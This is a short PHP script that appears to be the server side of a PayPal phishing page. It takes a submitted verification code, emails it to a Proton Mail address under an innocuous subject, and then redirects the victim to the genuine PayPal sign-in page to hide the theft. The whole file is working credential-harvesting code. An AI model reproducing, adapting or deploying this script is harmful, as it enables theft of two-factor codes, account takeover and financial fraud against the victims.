<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $verification_code = htmlspecialchars($_POST['verification_code']);
    
    
    $to = 'protectiondriveforclear@proton.me'; // Replace with your admin email
    $subject = "p r";
    $message = "Verification code: $verification_code";
    $headers = "From: protectiondriveforclear@proton.me"; // Replace with your from email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to another page
        header("Location: https://www.paypal.com/signin");
        exit();
    } else {
        echo "There was an error sending the email.";
    }
} else {
    echo "Invalid request.";
}
?>
